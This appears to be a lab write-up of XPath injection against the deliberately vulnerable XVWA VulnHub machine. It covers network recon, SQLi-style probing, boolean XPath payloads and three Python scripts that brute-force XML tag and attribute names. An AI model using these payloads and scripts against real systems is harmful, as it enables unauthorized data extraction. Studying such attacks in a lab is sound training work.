---
tags:
  - machine
  - vulnhub
  - xpath
  - arp-scan
  - nmap
  - python
---

![](../../Images/XVWA.png)

![](../../Images/Xtreme%20Vulnerable%20Web%20Application.png)

# Information

This machine host a lot of vulnerabilities, we only are going to exploit the **XPath Injections**

---

# Recon

## Search the machine in our network

We are going to realize an arp-scan too try to locate the victim machine

````bash
sudo arp-scan -I eth0 --localnet --ignoredups
````

![](../../Images/Pasted%20image%2020230902181854.png)

## Trying connectivity

We try if we have connectivity with them

````bash
ping -c 1 192.168.1.70
````

![](../../Images/Pasted%20image%2020230902181938.png)

Remember that we can imagine that the victim machine use a GNU/Linux SO by the TTL (The TTL by default in Linux machine is 64)

> [default device ttl](https://subinsb.com/default-device-ttl-values/)

## Port Scanning

We are going to do a port scanning to discover open TCP ports

````bash
sudo nmap -p- --open -sS --min-rate 4500 -vvv -n -Pn 192.168.1.70
````

![](../../Images/Pasted%20image%2020230902182320.png)

We are only interested in XPath Injection, we will not continue enumerating

## Open Web Browser

We can search the website:

> http://192.168.1.70/xvwa/


You have to see this

![](../../Images/Pasted%20image%2020230902182608.png)


You have to click In XPath Injection section

## Little change in the config of victim machine

Okay we are going to do add a tag for the future.

You have to go /var/www/html/xvwa/vulnerabilities/xpath and open the file **cofee.xml**

> nano cofee.xml

After the first item, below the price you can add a tag that call Secret

````xml
<Secret>This is a secret message and is not visible</Secret>
````

![](../../Images/Pasted%20image%2020230902183732.png)

Do a 

> service apache2 restart

If the output is fail, don't worry  if you do an **service apache2 status** you can see that everything is ok.


## Download coffee.xml

We are going to download this resource in our machine,

In the victim machine mount a python server

> python3 -m http.server 8084

Now in our machine we can download the file with curl

> wget 192.168.1.70:8084/coffee.xml

![](../../Images/Pasted%20image%2020230902184140.png)

Now we can begin with the exploitation of the vulnerabilty

## Intercept petition with Burpsuite

Before take the request, try the page, if you put a number they give you some information about a coffee, the number is an identifier.

![](../../Images/Pasted%20image%2020230902185242.png)

![](../../Images/Pasted%20image%2020230902185334.png)

The query to obtain the data is in home.php, we can get from the server

> wget 192.168.1.70:8084/home.php

![](../../Images/Pasted%20image%2020230902185542.png)

The result of the query will be

> /Coffees/Coffee\[@ID='1'\];

We intercept the request in the Burpsuite

And image that we don't have idea about what is running in the background, but this field is a potentially vector, we try with SQLi, NoSQLi

## Try injections (black box)

We can try

````bash
search=1'&submit=
search=1' or 1=1&submit=
````

Remember that in a query you have a single quoute that stay hanging

````sql
select * from coffees where id='1' or 1=1';
````

You can comment the rest to resolve:

````bash
search=1' or 1=1-- -&submit=
search=1' or 1=1#&submit=
````

Or you can avoid the comment if you add quotes like this:

````bash
search=1' or '1'='1&submit=
````

Remember, you can try this with double quoutes

Look up. You see that we are not closing the last quote because we image that have another quote that will be closing this quote.

And boom, we can see a lot of products

![](../../Images/Pasted%20image%2020230902191121.png)

But this is not SQL, remember

In this case the problem is the same 

> /Coffees/Coffee\[@ID='1'\];


As we assume that is a SQLi we keep trying with SQLi, remember, the next typicall query is:

````bash
search=1' order by 100-- -&submit=
````

Mmm, we don't see nothing, will there be fewer columns?

````bash
search=1' order by 3-- -&submit=
````

at first glance, they look like three columns

![](../../Images/Pasted%20image%2020230902191847.png)

But we can try 4,5,6 and doesn't work

You can try an union select

````bash
search=1' union select 1,2,3-- -&submit=
````

1,2,3,4... and the output is the same, Item not found

You can try other queries like:

````bash
search=1' or sleep(5)-- -&submit=
````

````bash
search=1' and sleep(5)-- -&submit=
````

In this situation, you should think about [XPath Injection](../../OWASP%20TOP%2010%20and%20web%20vulnerabilities/XPath%20Injections/XPath%20Injection.md) 

## Find the name of the tags, values of attributes...

All that we find we are going to represent in a xml file, in this case the name is data.xml

The first is discover how many primary tags are in the xml file, in this case only one **Coffees** 

With this query you are counting the primary tags that have the document

````bash
search=1' and count(/*)='1&submit=
````

The second quote is for closing the quote that we don't see.

If you put 2, you don't see the product, this mean that **only exists one** primary tag (remember that primary tag in this case is **Coffees**)

We know that we have a primary tag, but we don't know the name:

````xml
<>

</>
````

### Discover the name of the main/primary tag

````bash
search=1' and name(/*[1])='Coffees&submit=
````

`[1]` --> This indicate that you want to represent the name of the first tag, if you want the name of the second you will be put `[2]` 

But you don't know the name of the tag, to do this yo can play with substring like sqli

````bash
search=1' and substring(name(/*[1]),1,1)='C&submit=
````

`1,1` --> Indicate the first character

If you put a `c` you don't see the product

Now we are going to create an script to automatize this attack:


````python
#!/usr/bin/python3

from pwn import *
import time, sys, pdb, string, signal, requests

# Ctrl_c

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables

main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters # Characters in lowercase and uppercase

def xPathInjection():
    
    data = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1,8): # The length of the word ( 1-7 )
        for character in characters:                    
            
            post_data = { 
                    'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
                    'submit': '' 
            }
    
            r = requests.post(main_url, data=post_data)
            
            if len(r.text) != 8681:
                data += character
                p2.status(data)

                # ----------------------
                # TODO
                break
                # ----------------------

    p1.success("Brute force attack finished")
    p2.success(data)

if __name__ == '__main__':
    
    xPathInjection()

````


To know the length you can play with string-length()

````bash
search=1' and string-length(name(/*[1]))>'2&submit=
````

````bash
search=1' and string-length(name(/*[1]))='7&submit=
````

Now we know that we have to iterate for 7 characters

This is very util for our script

Nice!, we have the first tag **Coffees**

We can add this in our structure file (data.xml)


![](../../Images/Pasted%20image%2020230904140245.png)

## Enumerate the name of secondary tags

````bash
search=1' and count(/*[1]/*)>'7&submit=
````

You can put a `[1]` to indicate the discover tag and count the rest of tags in the next level

In this case we only see the coffee related with id 1

The total number of tags is **10**

````bash
search=1' and count(/*[1]/*)>='10&submit=
````

We add this information in our data.xml file

````xml
<Coffees>
	<Tag></Tag>
	<Tag></Tag>
	<Tag></Tag>
	<Tag></Tag>
	<Tag></Tag>
	<Tag></Tag>
	<Tag></Tag>
	<Tag></Tag>
	<Tag></Tag>
	<Tag></Tag>
</Coffees>
````

To know the name we can realize this:

First tag

````bash
search=1' and name(/*[1]/*[1])='Coffee&submit=
````

Second tag

````bash
search=1' and name(/*[1]/*[2])='Coffee&submit=
````

...

Remember that you can go character by character playing with **substring**

````bash
search=1' and substring(name(/*[1]/*[1]),1,1)='C&submit=
````

We can change a few things in the script and do the same process

We have to change the post_data (only search), the length of the response, the character that have to iterate

To see the new length, we can use `print(len(r.text))` and comment the rest, in this case is **8686**

To know the length of the tag you can use this:

````bash
search=1' and string-length(name(/*[1]/*[1]))='6&submit=
````

````python
#!/usr/bin/python3

from pwn import *
import time, sys, pdb, string, signal, requests

# Ctrl_c

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables

main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters # Characters in lowercase and uppercase

def xPathInjection():
    
    data = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1,7):
        for character in characters:                    
            
            post_data = { 
                    'search': "1' and substring(name(/*[1]/*[1]),%d,1)='%s"  % (position, character),
                    'submit': '' 
            }
    

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8686:
                data += character
                p2.status(data)

                # ----------------------
                # TODO
                break
                # ----------------------

    p1.success("Brute force attack finished")
    p2.success(data)

if __name__ == '__main__':
    
    xPathInjection()

````

Yeah!, we have it
![](../../Images/Pasted%20image%2020230904163639.png)

You can do this for every second tags (in this case all the tags are the same Coffee)

````python
'search': "1' and substring(name(/*[1]/*[2]),%d,1)='%s"  % (position, character),
````

You can add a new loop to iterate the second square brackets

Now we can change the data.xml file

If you are used nvim you can use

````bash
%s/Tag/Coffee/g
````

## How to see how many tags left

In this case we discover two tags

Coffeess and Coffee

You can see the number of missing tags with:

````bash
search=1' and count(/*[1]/*[1]/*)='5&submit=
````

In this case are 5 tags, (because we add an extra tag) if you only find 5 you have to check the xml file in the server

But inside the next tag only exists five **tags**

We can add this in own data.xml file
![](../../Images/Pasted%20image%2020230904171725.png)

You can enum the size of the rest of tags:

````bash
search=1' and count(/*[1]/*[2]/*)='5&submit=
````

## Discover the attributes of the secondary tags

````bash
search=1' and name(/*[1]/*[1]/*[1])='ID&submit=
````

You can use substring

````bash
search=1' and substring(name(/*[1]/*[1]/*[1]),1,1)='I&submit=
````

We are going to automatize this to our script

To not complicate the process we are going to image that the attributes don't have more than 20 characters

We know that there are five attributes, we adjust our loop to this

````python
#!/usr/bin/python3

from pwn import *
import time, sys, pdb, string, signal, requests

# Ctrl_c

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables

main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters # Characters in lowercase and uppercase

def xPathInjection():
    
    data = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Data")

    for first_position in range(1, 6):    
        for second_position in range(1,21):
            for character in characters:                    
                
                post_data = { 
                        'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (first_position, second_position, character),
                        'submit': '' 
                }
    
                r = requests.post(main_url, data=post_data)


                if len(r.text) != 8691 and len(r.text) != 8692 :
                    data += character
                    p2.status(data)

                    # ----------------------
                    # TODO
                    break
                    # ----------------------

        if first_position != 5:
            data += ":"

    p1.success("Brute force attack finished")
    p2.success(data)

if __name__ == '__main__':
    
    xPathInjection()

````